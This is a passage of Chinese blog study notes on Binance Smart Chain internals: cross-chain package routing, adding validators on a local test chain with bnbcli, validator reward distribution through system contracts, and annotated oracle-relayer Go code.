class="keyword">else</span> <span class="keyword">if</span> (packageType == FAIL_ACK_PACKAGE) &#123;</span><br><span class="line">        address handlerContract = channelHandlerContractMap[channelIdLocal];</span><br><span class="line">        try IApplication(handlerContract).handleFailAckPackage(channelIdLocal, msgBytes) &#123;</span><br><span class="line">        &#125; catch Error(<span class="type">string</span> memory reason) &#123;</span><br><span class="line">            emit unexpectedRevertInPackageHandler(handlerContract, reason);</span><br><span class="line">        &#125; catch (bytes memory lowLevelData) &#123;</span><br><span class="line">            emit unexpectedFailureAssertionInPackageHandler(handlerContract, lowLevelData);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    IRelayerIncentivize(INCENTIVIZE_ADDR).addReward(headerRelayer, msg.sender, relayFee, isRelayRewardFromSystemReward[channelIdLocal] || packageType != SYN_PACKAGE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一开始有多个modifier检验:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>onlyRelayer</code>: 仅允许中继器调用</p>
</li>
<li class="lvl-2">
<p><code>sequenceInOrder</code>: 检验sequence序列号是否按顺序</p>
</li>
<li class="lvl-2">
<p><code>blockSynced</code>: 在轻客户端合约中,该区块是否已经同步</p>
</li>
<li class="lvl-2">
<p><code>channelSupported</code>: 该通道是否已经注册,相当于channelId白名单机制</p>
</li>
</ul>
<blockquote>
<p>能够成功同步区块头数据是同步跨链数据包的前提。</p>
</blockquote>
<p>其中关键的代码段是:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (packageType == SYN_PACKAGE) &#123;</span><br><span class="line">   <span class="comment">// 根据channelId获取对应的系统合约地址</span></span><br><span class="line">   address handlerContract = channelHandlerContractMap[channelIdLocal];</span><br><span class="line">   <span class="comment">// 调用具体的系统合约处理跨链数据包</span></span><br><span class="line">   try IApplication(handlerContract).handleSynPackage(channelIdLocal, msgBytes) returns (bytes memory responsePayload) &#123;</span><br><span class="line">       <span class="keyword">if</span> (responsePayload.length != <span class="number">0</span>) &#123;</span><br><span class="line">           sendPackage(channelSendSequenceMap[channelIdLocal], channelIdLocal, encodePayload(ACK_PACKAGE, <span class="number">0</span>, responsePayload));</span><br><span class="line">           channelSendSequenceMap[channelIdLocal] = channelSendSequenceMap[channelIdLocal] + <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   ....</span><br></pre></td></tr></table></figure>
<p>并不是在跨链合约<code>CrossChain</code>中进行具体的数据包同步逻辑,<code>CrossChain</code>主要起到<code>跨链数据包校验、路由</code>的作用，根据不同的<code>channelId</code>,<code>CrossChain</code>会去调用对应的系统合约,由它们各自进行具体的跨链数据包处理。</p>
<h1>完整验证步骤:</h1>
<ol>
<li class="lvl-3">
<p>初始化并运行起BC链</p>
</li>
<li class="lvl-3">
<p>获取新的初始化共识状态数据,生成新的<code>genesis.json</code>，初始化并运行起BSC链</p>
</li>
<li class="lvl-3">
<p>BC链上,新增验证者</p>
</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># bnbcli staking bsc-create-validator --chain-id 715 --from bnb186t4z2pdu02khlfn5skqxpd36fwsa393mgu4hq --amount 2100000000000:BNB --moniker jerry_v1 --commission-rate 80000000 --commission-max-rate 95000000 --commission-max-change-rate 3000000 --side-chain-id bsc --side-cons-addr 0x86fDBAE16949433E5338846f75764067219fb221 --side-fee-addr 0x86fDBAE16949433E5338846f75764067219fb221</span></span><br><span class="line"></span><br><span class="line">Password to sign with <span class="string">&#x27;jerry&#x27;</span>:</span><br><span class="line">Committed at block 919 (tx <span class="built_in">hash</span>: 7E3B7A1038DD9C55FF3B476A1255C68D3FD17A11A876B66A5BFBDA4C9D83ECDD, response: &#123;Code:0 Data:[] Log:Msg 0:  Info: GasWanted:0 GasUsed:0 Events:[&#123;Type: Attributes:[&#123;Key:[100 101 115 116 105 110 97 116 105 111 110 45 118 97 108 105 100 97 116 111 114] Value:[98 118 97 49 56 54 116 52 122 50 112 100 117 48 50 107 104 108 102 110 53 115 107 113 120 112 100 51 54 102 119 115 97 51 57 51 109 53 97 57 102 121] XXX_NoUnkeyedLiteral:&#123;&#125; XXX_unrecognized:[] XXX_sizecache:0&#125; &#123;Key:[109 111 110 105 107 101 114] Value:[106 101 114 114 121 95 118 49] XXX_NoUnkeyedLiteral:&#123;&#125; XXX_unrecognized:[] XXX_sizecache:0&#125; &#123;Key:[105 100 101 110 116 105 116 121] Value:[] XXX_NoUnkeyedLiteral:&#123;&#125; XXX_unrecognized:[] XXX_sizecache:0&#125; &#123;Key:[97 99 116 105 111 110] Value:[115 105 100 101 95 99 114 101 97 116 101 95 118 97 108 105 100 97 116 111 114] XXX_NoUnkeyedLiteral:&#123;&#125; XXX_unrecognized:[] XXX_sizecache:0&#125;] XXX_NoUnkeyedLiteral:&#123;&#125; XXX_unrecognized:[] XXX_sizecache:0&#125;] Codespace: XXX_NoUnkeyedLiteral:&#123;&#125; XXX_unrecognized:[] XXX_sizecache:0&#125;)</span><br><span class="line"></span><br><span class="line">[root@localhost ~]<span class="comment"># bnbcli staking bsc-create-validator --chain-id 715 --from bnb1v64323yrzekauf89qhsfrvyhe7xsvsck00jwpv --amount 2200000000000:BNB --moniker six_v1 --commission-rate 80000000 --commission-max-rate 95000000 --commission-max-change-rate 3000000 --side-chain-id bsc --side-cons-addr 0xeE8620E0DEF0129c9b7a2F46C8C1C364B0869752 --side-fee-addr 0xeE8620E0DEF0129c9b7a2F46C8C1C364B0869752</span></span><br><span class="line">Password to sign with <span class="string">&#x27;six&#x27;</span>:</span><br><span class="line"></span><br><span class="line">Committed at block 927 (tx <span class="built_in">hash</span>: 35D7FB25C9BB6189E0B097A01F4C0839133F85ACBF0CBC24CC432198E9E4D331, response: &#123;Code:0 Data:[] Log:Msg 0:  Info: GasWanted:0 GasUsed:0 Events:[&#123;Type: Attributes:[&#123;Key:[100 101 115 116 105 110 97 116 105 111 110 45 118 97 108 105 100 97 116 111 114] Value:[98 118 97 49 118 54 52 51 50 51 121 114 122 101 107 97 117 102 56 57 113 104 115 102 114 118 121 104 101 55 120 115 118 115 99 107 48 110 110 55 108 103] XXX_NoUnkeyedLiteral:&#123;&#125; XXX_unrecognized:[] XXX_sizecache:0&#125; &#123;Key:[109 111 110 105 107 101 114] Value:[115 105 120 95 118 49] XXX_NoUnkeyedLiteral:&#123;&#125; XXX_unrecognized:[] XXX_sizecache:0&#125; &#123;Key:[105 100 101 110 116 105 116 121] Value:[] XXX_NoUnkeyedLiteral:&#123;&#125; XXX_unrecognized:[] XXX_sizecache:0&#125; &#123;Key:[97 99 116 105 111 110] Value:[115 105 100 101 95 99 114 101 97 116 101 95 118 97 108 105 100 97 116 111 114] XXX_NoUnkeyedLiteral:&#123;&#125; XXX_unrecognized:[] XXX_sizecache:0&#125;] XXX_NoUnkeyedLiteral:&#123;&#125; XXX_unrecognized:[] XXX_sizecache:0&#125;] Codespace: XXX_NoUnkeyedLiteral:&#123;&#125; XXX_unrecognized:[] XXX_sizecache:0&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ol start="4">
<li class="lvl-3">
<p>在BC上，查询top验证者</p>
</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># bnbcli staking  side-top-validators --trust-node --side-chain-id=&quot;bsc&quot;</span></span><br><span class="line">Validator</span><br><span class="line">Fee Address: bnb1v64323yrzekauf89qhsfrvyhe7xsvsck00jwpv</span><br><span class="line">Operator Address: bva1v64323yrzekauf89qhsfrvyhe7xsvsck0nn7lg</span><br><span class="line">Validator Consensus Pubkey:</span><br><span class="line">Jailed: <span class="literal">false</span></span><br><span class="line">Status: Unbonded</span><br><span class="line">Tokens: 2200000000000</span><br><span class="line">Delegator Shares: 2200000000000</span><br><span class="line">Description: &#123;six_v1   &#125;</span><br><span class="line">Bond Height: 0</span><br><span class="line">Unbonding Height: 0</span><br><span class="line">Minimum Unbonding Time: 1970-01-01 00:00:00 +0000 UTC</span><br><span class="line">Commission: &#123;rate: 80000000, maxRate: 95000000, maxChangeRate: 3000000, updateTime: 2022-09-26 08:15:29.716841534 +0000 UTC&#125;</span><br><span class="line">Distribution Addr: bnb1880pqwsmlzt58q57r7u5ycgn8fxnwxvxqppm9k</span><br><span class="line">Side Chain Id: bsc</span><br><span class="line">Consensus Addr on Side Chain: 0xeE8620E0DEF0129c9b7a2F46C8C1C364B0869752</span><br><span class="line">Fee Addr on Side Chain: 0xeE8620E0DEF0129c9b7a2F46C8C1C364B0869752</span><br><span class="line"></span><br><span class="line">Validator</span><br><span class="line">Fee Address: bnb186t4z2pdu02khlfn5skqxpd36fwsa393mgu4hq</span><br><span class="line">Operator Address: bva186t4z2pdu02khlfn5skqxpd36fwsa393m5a9fy</span><br><span class="line">Validator Consensus Pubkey:</span><br><span class="line">Jailed: <span class="literal">false</span></span><br><span class="line">Status: Unbonded</span><br><span class="line">Tokens: 2100000000000</span><br><span class="line">Delegator Shares: 2100000000000</span><br><span class="line">Description: &#123;jerry_v1   &#125;</span><br><span class="line">Bond Height: 0</span><br><span class="line">Unbonding Height: 0</span><br><span class="line">Minimum Unbonding Time: 1970-01-01 00:00:00 +0000 UTC</span><br><span class="line">Commission: &#123;rate: 80000000, maxRate: 95000000, maxChangeRate: 3000000, updateTime: 2022-09-26 08:15:21.651313673 +0000 UTC&#125;</span><br><span class="line">Distribution Addr: bnb1v839g444p5hlvk6ghe6ap4p4y7wnl83p5x0qn6</span><br><span class="line">Side Chain Id: bsc</span><br><span class="line">Consensus Addr on Side Chain: 0x86fDBAE16949433E5338846f75764067219fb221</span><br><span class="line">Fee Addr on Side Chain: 0x86fDBAE16949433E5338846f75764067219fb221</span><br></pre></td></tr></table></figure>
<ol start="5">
<li class="lvl-3">
<p>启动bsc-relayer，拉取BC数据，同步到BSC上</p>
</li>
<li class="lvl-3">
<p>查看区块浏览器的结果:<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220926172659.png" alt="20220926172659" /><br />
调用<code>CrossChain</code>系统合约的交易均成功</p>
</li>
<li class="lvl-3">
<p>查询系统合约<code>BSCValidatorSet</code>里的数据</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220926172805.png" alt="20220926172805" /><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220926172818.png" alt="20220926172818" /><br />
能查到新的验证者数据。</p>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.jianshu.com/p/27da6e395ec9">【BSC详解】3——bsc</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>Solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-Bsc详解-验证节点奖励测试</title>
    <url>/2022/24344.html</url>
    <content><![CDATA[<h1>引言:</h1>
<p>还是围绕验证者管理模块进行,上次完成了添加新的验证者,这次围绕验证者的奖励进行验证/学习/测试。</p>
<p>目的:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>验证者能够查询自己的收入</p>
</li>
<li class="lvl-2">
<p>验证者能够获取到自己的挖矿收益</p>
</li>
</ul>
<h1>BC权益质押:</h1>
<p>参考白皮书,可知币安链在在BC上完成了BSC的<code>权益质押逻辑</code>：</p>
<ol>
<li class="lvl-3">
<p>质押代币是 BNB，这是因为它是两个区块链上的原生代币。</p>
</li>
<li class="lvl-3">
<p>在BC上记录BSC的权益质押和委托行为。</p>
</li>
<li class="lvl-3">
<p>BSC 验证人集由它的权益质押和委托逻辑来决定，在BC上构建一个BSC的权益质押模块，并通过跨链通信在每天UTC 00:00:00 由BC传送到 BSC 。</p>
</li>
<li class="lvl-3">
<p>BC上的奖励分配发生在每天UTC 00:00时刻。</p>
</li>
</ol>
<h2 id="奖励-2">奖励:</h2>
<p>验证人集更新和奖励分配都发生在每天的UTC 00:00 。这是为了节省频繁更新和区块奖励分配的成本。频繁分配奖励的代价可能是巨大的，因为<code>区块奖励是在BSC上收取的，并在BC上分发给BSC验证人和委托人</code>。（请注意，BC出块奖励仅分发给BC验证人。）</p>
<p>为了确保分配是公平的，这里引入了一种延后分配的算法：</p>
<ol>
<li class="lvl-3">
<p>区块奖励不会立即发送给验证人，而是计算并积累在智能合约中；</p>
</li>
<li class="lvl-3">
<p>当BSC收到验证人集更新消息时，它将触发跨链转账，将奖励转账给验证人的托管地址。 托管地址是由系统控制，因此在向委派者承诺的分配完成之前，奖金是不能用的。</p>
</li>
<li class="lvl-3">
<p>为了使同步更简单，并分配时间以防出现罚没，第T天的奖励将在第T + 2 天分配。 在委托人收到奖励后，剩下的收益将被转移到验证人自己的奖励地址。</p>
</li>
</ol>
<h1>奖励分配流程:</h1>
<h2 id="主网Tx例子">主网Tx例子:</h2>
<p>缩小block区间,在bscan上获取一个tx,其中<code>Transaction Receipt Event Logs</code>里有与<code>BSCValidatorSet.sol</code>(<code>0x0000000000000000000000000000000000001000</code>)的交互记录,通过这个<a href="https://dashboard.tenderly.co/tx/bsc/0x474b38f8531aff6775d9f1cb90afcc63566bbd8c5f04f45ce5681406226b80aa">tx</a>在tenderly查看,方便自己理解系统合约间的内部调用关系。<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221022163607.png" alt="20221022163607" /><br />
<code>CrossChain.sol</code>——&gt; <code>BSCValidatorSet.sol</code>——&gt;<code>TokenHub.sol</code></p>
<h2 id="tx-BSCValidatorSet-sol">tx-&gt; BSCValidatorSet.sol:</h2>
<blockquote>
<p>区块奖励不会立即发送给验证人，而是计算并积累在智能合约中；</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221022165525.png" alt="20221022165525" /><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221022165732.png" alt="20221022165732" /><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221020180049.png" alt="20221020180049" /><br />
验证者的奖励/收益来源于区块内的交易手续费(gas fee),奖励会先累计在<code>BSCValidatorSet.sol</code>合约中。</p>
<h2 id="bsc-relayer-BSC">bsc-relayer-&gt;BSC:</h2>
<p>流程图:<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221022162856.png" alt="20221022162856" /></p>
<p>每天0点时,<code>bsc-relayer</code>会将区块头和跨链包数据同步到BSC上。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>bsc-relayer</code>调用<code>CrossChain.sol</code>(<code>0x0000000000000000000000000000000000002000</code>)跨链合约</p>
</li>
<li class="lvl-2">
<p>再内部调用<code>BSCValidatorSet.sol</code>(<code>0x0000000000000000000000000000000000001000</code>)的<code>updateValidatorSet</code>函数</p>
</li>
<li class="lvl-2">
<p>再内部调用<code>TokenHub.sol</code>(<code>0x0000000000000000000000000000000000001004</code>)的<code>batchTransferOutBNB</code>函数</p>
</li>
<li class="lvl-2">
<p>再内部调用<code>CrossChain.sol</code>(<code>0x0000000000000000000000000000000000002000</code>)跨链合约的<code>sendSynPackage</code>函数</p>
</li>
</ul>
<h3 id="BSCValidatorSet-sol">BSCValidatorSet.sol:</h3>
<p>BSC收到验证人集更新消息,BSCValidatorSet合约中<code>updateValidatorSet</code>函数中会执行以下的步骤:</p>
<p>step 0: force all maintaining validators to exit <code>Temporary Maintenance</code></p>
<ul class="lvl-0">
<li class="lvl-2">
<ol>
<li class="lvl-5">validators exit maintenance 验证者退出维护状态</li>
</ol>
</li>
<li class="lvl-2">
<ol start="2">
<li class="lvl-5">clear all maintainInfo  清除所有维护信息</li>
</ol>
</li>
<li class="lvl-2">
<ol start="3">
<li class="lvl-5">get unjailed validators from validatorSet 从验证者集合中获取未被监禁的验证者</li>
</ol>
</li>
</ul>
<p>step1：do calculate distribution, do not make it as an internal function for saving gas. 计算分配<br />
验证者的收入 &gt; 0.1bnb, 则进行跨链转账，小于则进行直接转账</p>
<p>step2：执行跨链转账:<br />
将跨链转账总额转到<code>TokenHub.sol</code>合约中，调用<code>batchTransferOutBNB</code>函数,会传几个参数:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>crossTotal： 跨链转账总额,总共多少BNB 见主网tx例子:大概2000个BNB左右</p>
</li>
<li class="lvl-2">
<p>crossAddrs数组: 验证者的BBCFeeAddress,BC收款地址</p>
</li>
<li class="lvl-2">
<p>crossAmounts数组：验证者的收入</p>
</li>
<li class="lvl-2">
<p>crossRefundAddrs数组: 也是验证者的BBCFeeAddress,BC收款地址</p>
</li>
</ul>
<p>step3：执行直接转账: 收入少的话则,直接转账: 将验证者的收入转到验证者的收款地址中<br />
step4: do dusk transfer  应该是把合约里剩余的零钱转走<br />
step5: do update validator set state 更新验证者集合状态<br />
step6: clean slash contract  清空惩罚slash合约状态</p>
<h3 id="TokenHub-sol">TokenHub.sol:</h3>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">batchTransferOutBNB</span>(<span class="params">address[] calldata recipientAddrs, uint256[] calldata amounts, address[] calldata refundAddrs, uint64 expireTime</span>) external override onlyInit payable returns (bool) &#123;</span><br><span class="line">	<span class="comment">// 数组长度必须相等</span></span><br><span class="line">	...</span><br><span class="line">	<span class="comment">// 精度损失检查</span></span><br><span class="line">	...</span><br><span class="line">	rewardForRelayer = msg.<span class="property">value</span>.<span class="title function_">sub</span>(totalAmount);</span><br><span class="line">	<span class="comment">// 构造同步包 代币转出同步包</span></span><br><span class="line">	<span class="title class_">TransferOutSynPackage</span> memory transOutSynPkg = <span class="title class_">TransferOutSynPackage</span>(&#123;</span><br><span class="line">	bep2TokenSymbol : <span class="title class_">BEP2</span>_TOKEN_SYMBOL_FOR_BNB,</span><br><span class="line">	contractAddr : <span class="title function_">address</span>(<span class="number">0x00</span>), <span class="comment">// 销毁地址</span></span><br><span class="line">	amounts : convertedAmounts, <span class="comment">// 转出数量</span></span><br><span class="line">	recipients : recipientAddrs, <span class="comment">// 转出地址</span></span><br><span class="line">	refundAddrs : refundAddrs, <span class="comment">// 退款地址</span></span><br><span class="line">	expireTime : expireTime <span class="comment">// 过期时间</span></span><br><span class="line">	&#125;);</span><br><span class="line">	<span class="comment">// 调用CrossChain合约的sendSynPackage</span></span><br><span class="line">	<span class="title class_">ICrossChain</span>(<span class="variable constant_">CROSS_CHAIN_CONTRACT_ADDR</span>).<span class="title function_">sendSynPackage</span>(<span class="variable constant_">TRANSFER_OUT_CHANNELID</span>, <span class="title function_">encodeTransferOutSynPackage</span>(transOutSynPkg), rewardForRelayer.<span class="title function_">div</span>(<span class="variable constant_">TEN_DECIMALS</span>));</span><br><span class="line">	emit <span class="title function_">transferOutSuccess</span>(<span class="title function_">address</span>(<span class="number">0x0</span>), msg.<span class="property">sender</span>, totalAmount, rewardForRelayer);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主要是先进行各种值的检验、构造同步包、调用<code>CrossChain</code>合约的<code>sendSynPackage</code>函数发送同步包</p>
<h2 id="oracle-relayer-BC">oracle-relayer -&gt; BC:</h2>
<h3 id="oracle-relayer">oracle-relayer:</h3>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221022190745.png" alt="20221022190745" /><br />
作用: 拉取 BSC 的跨链数据包，并针对 BC 的预言（prophecy）进行声明（claim）；</p>
<h4 id="介绍-2">介绍:</h4>
<p>BC上的oracle模块是与 gov类似的通用模块，用于处理预言和声明。</p>
<p>预言意味着验证者希望就某些事情达成共识，例如跨链转移。<br />
声明由验证者提出，声明的内容是跨链转移。</p>
<blockquote>
<p>validator在哪提出声明（claim）?</p>
</blockquote>
<p>当大多数验证者（如 70%）在预言上声明相同的东西时，获胜的声明将被执行。因为 oracle 模块是一个普通模块，其他依赖于 oracle 模块的模块将注册声明类型和相关的钩子检查和处理宣称。<br />
每个声明类型都有一个序列，oracle 模块应该按序列处理预言和声明。当一个预言执行成功时，声明类型的序列将加一。</p>
<h4 id="Oracle模块流程">Oracle模块流程:</h4>
<ol>
<li class="lvl-3">
<p>Oracle 模块从验证者接收到声明消息，如果序列不是当前序列，则声明消息将被拒绝。</p>
</li>
<li class="lvl-3">
<p>如果序列有效，则声明类型的钩子将检查声明消息，如果声明消息无效，则返回</p>
</li>
<li class="lvl-3">
<p>如果声明消息有效并且是第一个声明，则将创建相关的预言。如果声明消息不是第一个声明，则将其添加到已存在的预言中。</p>
</li>
<li class="lvl-3">
<p>如果声明相同内容的验证者的权力达到 70% 之类的阈值，则预言将被标记为成功，钩子将执行获胜的声明。并且索赔类型的顺序将增加。</p>
</li>
<li class="lvl-3">
<p>如果验证者没有机会达成共识，则预言将被标记为失败，预言将被删除，验证者应重新开始。</p>
</li>
</ol>
<blockquote>
<p>BC上是如何创建预言?</p>
</blockquote>
<h4 id="Oracle-relayer源码">Oracle-relayer源码:</h4>
<p><code>oracle-relayer</code>中主要两个文件是</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>oracle-relayer\observer\observer.go</code></p>
</li>
<li class="lvl-2">
<p><code>oracle-relayer\relayer\relayer.go</code></p>
</li>
</ul>
<h4 id="observer观察者">observer观察者:</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">observer/observer.go</span><br></pre></td></tr></table></figure>
<p>主要做的工作就是 同步bsc区块/跨链包的数据</p>
<ol>
<li class="lvl-3">
<p>逐个区块高度读取BSC上的区块数据</p>
</li>
<li class="lvl-3">
<p>将区块数据、区块内的跨链包数据存储在数据库中</p>
</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">2022-10-19 00:19:10 INFO Fetch fetch block, height=130180</span><br><span class="line">2022-10-19 00:19:10 INFO Fetch fetch block, height=130181</span><br><span class="line">2022-10-19 00:19:10 INFO Fetch fetch block, height=130182</span><br><span class="line">2022-10-19 00:19:10 INFO Fetch fetch block, height=130183</span><br><span class="line">2022-10-19 00:19:10 INFO Fetch fetch block, height=130184</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221022180111.png" alt="20221022180111" /><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221022180203.png" alt="20221022180203" /></p>
<h4 id="relayer中继器">relayer中继器:</h4>
<p>主要的作用就是，按序发送发送跨链数据包到BC链，对预言进行声明</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 发送跨链数据包到BC链</span></span><br><span class="line"><span class="comment">// 处理跨链数据包的具体函数,主要逻辑</span></span><br><span class="line"><span class="comment">// process relays the next batch of packages to Binance Chain</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *Relayer)</span></span> process(chainId <span class="type">uint16</span>) <span class="type">error</span> &#123;</span><br><span class="line">	<span class="comment">// 连接BC,获取当前序列号</span></span><br><span class="line">	sequence, err := r.BBCExecutor.GetCurrentSequence(chainId)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		util.Logger.Errorf(<span class="string">&quot;get current sequence error: chainId=%d, err=%s&quot;</span>,</span><br><span class="line">			chainId, err.Error())</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	util.Logger.Infof(<span class="string">&quot;current sequence, chain_id=%d, seq=%d&quot;</span>, chainId, sequence)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 从数据库中查出 所有需要声明的跨链包交易,这些交易都是bsc中继器调用Crosschain合约的交易</span></span><br><span class="line">	<span class="comment">// 这些交易都是 被确认过的交易</span></span><br><span class="line">	claimLogs := <span class="built_in">make</span>([]*model.CrossChainPackageLog, <span class="number">0</span>)</span><br><span class="line">	err = r.DB.Where(<span class="string">&quot;oracle_sequence = ? and chain_id = ? and status = ?&quot;</span>,</span><br><span class="line">		sequence, chainId, model.PackageStatusConfirmed).Order(<span class="string">&quot;tx_index asc&quot;</span>).Find(&amp;claimLogs).Error</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		util.Logger.Errorf(<span class="string">&quot;query claim log error: err=%s&quot;</span>, err.Error())</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;[*] claimLogs: %v\n&quot;</span>, claimLogs)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;[*] len claimLogs: %d\n&quot;</span>, <span class="built_in">len</span>(claimLogs))</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(claimLogs) == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;no packages found&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 查询预言值</span></span><br><span class="line">	prophecy, err := r.BBCExecutor.GetProphecy(chainId, sequence)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;[*] prophecy: %v\n&quot;</span>, prophecy)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		util.Logger.Errorf(<span class="string">&quot;get prophecy error: err=%s&quot;</span>, err.Error())</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 验证者地址</span></span><br><span class="line">	validatorAddress := r.BBCExecutor.GetAddress()</span><br><span class="line">	fmt.Printf(<span class="string">&quot;[*] validatorAddress: %s\n&quot;</span>, validatorAddress)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 检查预言值是否已经被声明</span></span><br><span class="line">	<span class="keyword">if</span> prophecy != <span class="literal">nil</span> &amp;&amp; prophecy.ValidatorClaims != <span class="literal">nil</span> &amp;&amp; prophecy.ValidatorClaims[validatorAddress.String()] != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;already claimed&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	packages := <span class="built_in">make</span>(msg.Packages, <span class="number">0</span>, <span class="built_in">len</span>(claimLogs))</span><br><span class="line">	<span class="comment">// 跨链交易记录 构造成 数据包</span></span><br><span class="line">	<span class="keyword">for</span> _, claimLog := <span class="keyword">range</span> claimLogs &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;[*] claimLog: %v\n&quot;</span>, claimLog)</span><br><span class="line">		payload, err := hex.DecodeString(claimLog.PayLoad)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;decode payload error, payload=%s&quot;</span>, claimLog.PayLoad)</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		pack := msg.Package&#123;</span><br><span class="line">			ChannelId: types.IbcChannelID(claimLog.ChannelId),</span><br><span class="line">			Sequence:  claimLog.PackageSequence,</span><br><span class="line">			Payload:   payload,</span><br><span class="line">		&#125;</span><br><span class="line">		packages = <span class="built_in">append</span>(packages, pack)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	encodedPackages, err := rlp.EncodeToBytes(packages)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;encode packages error, err=%s&quot;</span>, err.Error())</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	util.Logger.Infof(<span class="string">&quot;claim, chain_id=%d, seq=%d, payload=%s&quot;</span>,</span><br><span class="line">		chainId, sequence, hex.EncodeToString(encodedPackages))</span><br><span class="line">	<span class="comment">// 处理声明</span></span><br><span class="line">	<span class="comment">//tmpChainId := uint16(715)</span></span><br><span class="line">	txHash, err := r.BBCExecutor.Claim(chainId, <span class="type">uint64</span>(sequence), encodedPackages)</span><br><span class="line">	<span class="comment">//txHash, err := r.BBCExecutor.Claim(tmpChainId, uint64(sequence), encodedPackages)</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		util.Logger.Errorf(<span class="string">&quot;claim error: err=%s&quot;</span>, err.Error())</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 更新数据库中的跨链包记录, 将状态改为已声明</span></span><br><span class="line">	err = r.DB.Model(model.CrossChainPackageLog&#123;&#125;).Where(<span class="string">&quot;oracle_sequence = ? and chain_id = ?&quot;</span>, sequence, chainId).Update(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;&#123;</span><br><span class="line">		<span class="string">&quot;status&quot;</span>:        model.PackageStatusClaimed,</span><br><span class="line">		<span class="string">&quot;claim_tx_hash&quot;</span>: txHash,</span><br><span class="line">		<span class="string">&quot;update_time&quot;</span>:   time.Now().Unix(),</span><br><span class="line">	&#125;).Error</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		util.Logger.Errorf(<span class="string">&quot;update CrossChainPackageLog error, err=%s&quot;</span>, err.Error())</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>完整测试/验证步骤:</h1>
<h2 id="模拟多个验证者">模拟多个验证者:</h2>
<p>先模拟BSC上正常的情况:<br />
有2个验证者节点,两个节点要在区块链浏览器上能看到,块要由他们轮流出</p>
<p>浏览器查看出块情况:<br />
